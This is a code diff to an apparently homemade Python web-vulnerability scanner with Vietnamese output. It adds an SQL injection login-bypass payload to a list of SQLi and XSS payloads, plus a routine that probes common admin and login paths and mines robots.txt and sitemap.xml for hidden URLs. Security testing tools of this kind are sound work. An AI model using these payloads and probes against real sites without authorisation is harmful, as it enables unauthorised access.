@@ -15,9 +15,12 @@ SQLI_ERRORS = [
 COMMON_PORTS = {80, 443, 8080, 8443}
 
 PAYLOADS = {
-    "SQL Injection": ["' OR '1'='1", "admin' --", "' UNION SELECT null, version() --"],
+    "SQL Injection": ["' OR '1'='1", "admin' --", "' UNION SELECT null, version() --","admin' OR '1'='1' #"
+],
     "XSS": ["<script>alert('XSS')</script>", "<img src='x' onerror='alert(1)'>"]
 }
+
+COMMON_PATHS = ["/login.php", "/admin", "/user/login", "/auth", "/signin", "/dashboard", "/controlpanel"]
 
 def scan_ports(target, port_range=range(1, 1025)):
     open_ports = []
@@ -107,14 +110,44 @@ def detect_protocol(target):
             return None
     return target
 
+def find_common_paths(target):
+    print("[+] Đang kiểm tra các đường dẫn phổ biến...")
+    for path in COMMON_PATHS:
+        full_url = f"{target}{path}"
+        response = safe_request(full_url)
+        if response and response.status_code == 200:
+            print(f"[+] Phát hiện đường dẫn: {full_url}")
+    
+    # Kiểm tra robots.txt
+    robots_url = f"{target}/robots.txt"
+    response = safe_request(robots_url)
+    if response and response.status_code == 200:
+        print("[+] Tìm thấy robots.txt, kiểm tra các đường dẫn bị ẩn...")
+        for line in response.text.split("\n"):
+            if "Disallow:" in line:
+                hidden_path = line.split(": ")[-1].strip()
+                full_hidden_url = f"{target}{hidden_path}"
+                print(f"[+] Đường dẫn từ robots.txt: {full_hidden_url}")
+    
+    # Kiểm tra sitemap.xml
+    sitemap_url = f"{target}/sitemap.xml"
+    response = safe_request(sitemap_url)
+    if response and response.status_code == 200:
+        print("[+] Tìm thấy sitemap.xml, trích xuất các URL...")
+        soup = BeautifulSoup(response.text, "xml")
+        urls = soup.find_all("loc")
+        for url in urls:
+            print(f"[+] URL từ sitemap: {url.text}")
+
 def run_web_scan(target):
     target = detect_protocol(target)
     if not target:
         return
-    print(f"[+] Đang quét web tại: {target}")
+    print(f"[+] Quét web tại: {target}")
     forms = extract_forms(target)
     check_sqli(target, forms)
     check_xss(target, forms)
+    find_common_paths(target)
     print(f"[+] Tìm thấy {len(forms)} form nhập liệu trên trang.")
 
 def scan_target():
